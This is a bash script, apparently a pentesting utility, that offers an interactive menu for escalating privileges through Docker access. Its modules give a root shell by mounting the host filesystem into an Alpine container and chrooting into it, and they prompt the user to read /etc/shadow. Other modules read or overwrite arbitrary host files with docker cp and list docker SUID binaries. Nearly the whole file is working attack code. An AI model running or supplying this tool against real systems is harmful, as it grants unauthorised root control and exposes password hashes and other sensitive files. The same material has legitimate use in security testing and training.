#!/bin/bash

# Author: Jesús Germán Sánchez González (aka elkoyote)

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

trap ctrl_c INT

function ctrl_c(){
	echo -e "\n${redColour}[!] Exiting...\n${endColour}"
    exit 1
}

function shell(){
    echo -e "\n\n\t\t\t${turquoiseColour} SHELL module${endColour}"
    echo -e "\n${grayColour}[*] ${endColour}${redColour}Spawning shell...${endColour}"
    echo -e "${grayColour}[!] ${endColour}${blueColour}Try to run \"cat /etc/shadow\"${endColour}"
    docker run -v /:/mnt --rm -it alpine chroot /mnt sh
}

function fw(){
    echo -e "\n\n\t\t\t${turquoiseColour} FILE WRITE module${endColour}"
    CONTAINER_ID="$(docker run -d alpine)"
    TF=$(mktemp)
    echo "DATA" > $TF
    docker cp $TF $CONTAINER_ID:$TF
    echo -e "\n${grayColour}[*] ${endColour}${redColour}Type file path to write...${endColour}"
    read -p $'\e[0;33m[?] \e[0m' FILE
    docker cp $CONTAINER_ID:$TF $FILE
}

function fr(){
    echo -e "\n\n\t\t\t${turquoiseColour} FILE READ module${endColour}"
    CONTAINER_ID="$(docker run -d alpine)"
    TF=$(mktemp)
    echo -e "\n${grayColour}[*] ${endColour}${redColour}Type file path to read...${endColour}"
    read -p $'\e[0;33m[?] \e[0m' FILE
    docker cp $FILE $CONTAINER_ID:$TF
    docker cp $CONTAINER_ID:$TF $TF
    cat $TF
}

function suid(){
    echo -e "\n\n\t\t\t${turquoiseColour} SUID module${endColour}"
    echo -e "\n${grayColour}[!] ${endColour}${blueColour}Trying to find docker SUIDs${endColour}"
    find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null | grep docker 
}

function sudo(){
    echo -e "\n\n\t\t\t${turquoiseColour} SUDO module${endColour}"
    echo -e "\n${grayColour}[!] ${endColour}${redColour}This module does not work properly...${endColour}"
    echo -e "\n${grayColour}[!] ${endColour}${blueColour}Type this command: sudo -S -l -k${endColour}"
    exit 1
}

function helpPanel(){

	echo -e "\n\t${purpleColour}a${endColour}${yellowColour} All Tests Mode${endColour}"
	echo -e "\n\t\t${blueColour}GTFOBins${endColour}"
	echo -e "\t\t\t${grayColour}Shell${endColour}${redColour} (Spawn interactive shell)${endColour}"
	echo -e "\t\t\t${grayColour}File write ${redColour}(Check file file target to write)${endColour}"
	echo -e "\t\t\t${grayColour}File read ${redColour}(Check file target to read)${endColour}"
    echo -e "\t\t\t${grayColour}SUID ${redColour}(Check SUID bit)${endColour}"
	echo -e "\t\t\t${grayColour}Sudo ${redColour}(Check Sudo)${endColour}"
	echo -e "\n\t${purpleColour}sh${endColour}${yellowColour} Shell${endColour}"
    echo -e "\n\t${purpleColour}fw${endColour}${yellowColour} File write${endColour}"
    echo -e "\n\t${purpleColour}fr${endColour}${yellowColour} File read${endColour}"
    echo -e "\n\t${purpleColour}s${endColour}${yellowColour} SUID${endColour}"
    echo -e "\n\t${purpleColour}su${endColour}${yellowColour} Sudo${endColour}"
	echo -e "\n\t${purpleColour}h${endColour}${yellowColour} Show this help pannel${endColour}"
}

function choice(){
	
	echo -e "\n${yellowColour} Select an option${endColour}"
	# Select an option
    read -p $'\e[0;33m[?] \e[0m' option

    if [ "$option" == "a" ]; then
        shell
        fw
        fr
        suid
        sudo
    elif [ "$option" == "sh" ]; then
        shell
    elif [ "$option" == "fw" ]; then
        fw
    elif [ "$option" == "fr" ]; then
        fr
    elif [ "$option" == "s" ]; then
        echo -e "\n${grayColour}[*] ${endColour}${redColour}Spawning shell...${endColour}"
        suid
    elif [ "$option" == "su" ]; then
        sudo
    elif [ "$option" == "h" ]; then
        helpPanel
    else
        echo -e "\n${redColour}[!] Invalid option${endColour}"
        helpPanel
    fi
}

helpPanel
choice